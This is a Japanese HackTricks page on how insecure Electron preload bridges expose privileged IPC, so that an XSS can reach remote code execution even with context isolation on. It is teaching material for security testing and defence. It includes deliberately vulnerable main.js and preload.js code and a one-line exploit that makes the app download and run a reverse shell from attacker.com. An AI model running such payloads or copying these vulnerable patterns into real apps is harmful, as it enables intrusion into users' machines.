# Electron contextIsolation による IPC 経由の RCE

{{#include ../../banners/hacktricks-training.md}}

context isolation を有効にしても、安全でない preload bridge が安全になるわけではありません。preload が renderer のコンテンツに特権的な IPC を公開している場合、XSS や侵害された renderer からその bridge を呼び出せます。RCE が可能かどうかは、対応する main-process handler の検証と権限に左右されます。Electron は、操作ごとに限定的なメソッドを1つずつ公開し、IPC の送信元を検証し、生の IPC プリミティブを公開しないことを推奨しています。<sup>[[3]](#references)[[4]](#references)</sup>

**これらの例のほとんどはここから引用しました** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo)。詳しくは動画を確認してください。<sup>[[1]](#references)</sup>

## 例 0

[https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) の例です（スライドでは、MS Teams で XSS から RCE に至った手法の全容を確認できます。ここではごく基本的な例のみを示します）。<sup>[[2]](#references)</sup>

<figure><img src="../../images/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 例 1

`main.js` が `getUpdate` をリッスンし、渡された **任意の URL をダウンロードして実行する**ことを確認してください。\
また、`preload.js` が main からの **任意の IPC イベントを公開している**ことも確認してください。

```javascript
// Part of code of main.js
ipcMain.on("getUpdate", (event, url) => {
  console.log("getUpdate: " + url)
  mainWindow.webContents.downloadURL(url)
  mainWindow.download_url = url
})

mainWindow.webContents.session.on(
  "will-download",
  (event, item, webContents) => {
    console.log("downloads path=" + app.getPath("downloads"))
    console.log("mainWindow.download_url=" + mainWindow.download_url)
    url_parts = mainWindow.download_url.split("/")
    filename = url_parts[url_parts.length - 1]
    mainWindow.downloadPath = app.getPath("downloads") + "/" + filename
    console.log("downloadPath=" + mainWindow.downloadPath)
    // Set the save path, making Electron not to prompt a save dialog.
    item.setSavePath(mainWindow.downloadPath)

    item.on("updated", (event, state) => {
      if (state === "interrupted") {
        console.log("Download is interrupted but can be resumed")
      } else if (state === "progressing") {
        if (item.isPaused()) console.log("Download is paused")
        else console.log(`Received bytes: ${item.getReceivedBytes()}`)
      }
    })

    item.once("done", (event, state) => {
      if (state === "completed") {
        console.log("Download successful, running update")
        fs.chmodSync(mainWindow.downloadPath, 0755)
        var child = require("child_process").execFile
        child(mainWindow.downloadPath, function (err, data) {
          if (err) {
            console.error(err)
            return
          }
          console.log(data.toString())
        })
      } else console.log(`Download failed: ${state}`)
    })
  }
)
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```

Exploit:

```html
<script>
  electronSend("getUpdate", "https://attacker.com/path/to/revshell.sh")
</script>
```

## 例 2

preload が scheme と遷移先の検証なしに `shell.openExternal` を公開している場合、renderer で制御された入力によって登録済みの外部ハンドラーを起動できます。それがコード実行につながるかどうかは、プラットフォーム、インストールされているハンドラー、scheme、Electron のバージョンによって異なります。想定される `https:` の遷移先を明示的な allowlist に限定してください。<sup>[[3]](#references)</sup>

```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
  shell.openExternal(url)
}
```

## 例3

preload が main process との制限のない通信を公開している場合、XSS により任意の channel 名とデータを送信できます。影響は、登録されている IPC handler とその認可チェックによって異なります。

```javascript
window.electronListen = (event, cb) => {
  ipcRenderer.on(event, cb)
}

window.electronSend = (event, data) => {
  ipcRenderer.send(event, data)
}
```


## References

- [1] [XSSとRCEを用いた最新デスクトップアプリのハッキングワークショップ](https://www.youtube.com/watch?v=xILfQGkLXQo)
- [2] [Microsoft Teamsをハックし、Pwn2Ownで150,000ドルを獲得した方法](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)
- [3] [Electron — セキュリティチェックリスト](https://www.electronjs.org/docs/latest/tutorial/security)
- [4] [Electron — コンテキスト分離と安全なAPI公開](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
{{#include ../../banners/hacktricks-training.md}}
